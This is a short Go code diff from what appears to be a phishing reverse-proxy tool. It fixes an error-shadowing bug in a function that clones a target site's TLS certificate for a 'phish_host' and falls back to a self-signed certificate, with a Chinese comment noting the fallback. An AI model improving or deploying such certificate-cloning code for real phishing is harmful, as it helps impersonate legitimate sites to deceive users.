@@ -415,16 +415,16 @@ func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port i
 		}
 		template.Subject.CommonName = host
 	} else {
-		srvCert, err := o.getTLSCertificate(host, port)
+		srvCert, cloneErr := o.getTLSCertificate(host, port)
 		serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
 		serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
 		if err != nil {
 			return nil, err
 		}
 
-		if err != nil {
+		if cloneErr != nil {
 			// 克隆失败，fallback 到简单自签证书
-			log.Warning("failed to clone cert for %s:%d, using simple self-signed: %v", host, port, err)
+			log.Warning("failed to clone cert for %s:%d, using simple self-signed: %v", host, port, cloneErr)
 			template = x509.Certificate{
 				SerialNumber:          serialNumber,
 				Issuer:                x509ca.Subject,
